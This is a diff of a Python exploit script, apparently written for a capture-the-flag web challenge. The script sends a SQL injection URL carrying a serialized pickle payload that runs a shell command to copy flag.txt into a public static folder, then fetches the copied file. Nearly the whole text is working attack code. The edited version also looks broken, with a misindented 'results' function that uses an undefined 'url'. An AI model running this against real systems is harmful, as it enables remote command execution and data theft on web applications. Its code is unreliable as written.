@@ -6,12 +6,6 @@ import requests
 import threading
 import time
 
-import sys
-import base64
-import pickle
-import os
-import requests
-import threading
  
 payload = "cat flag.txt > application/static/flag.txt"
 
@@ -32,17 +26,20 @@ def exploit(url):
     # Construct the final URL by appending the serialized payload
     final_url = f"{url}/view/' UNION SELECT '{serialized_payload}"
 
-    # Perform a GET request to the constructed URL
+    # Perform a GET request. Exploiting the SQLi.
     response = requests.get(final_url)
 
+ def results():
     check_url = f"{url}/static/flag.txt"
     response = requests.get(check_url)
     print(f"Checking if the exploit worked")
     print(response.text)
 
 if __name__ == "__main__":
-    # Example usage
     target_url = "http://IP:PORT"  # Replace with the target URL
 
     print("[*] Executing program: Pickle Rick..")
     exploit(target_url)
+    time.sleep(2)
+    print("[*] Pickle Rick is returning...")
+    results()
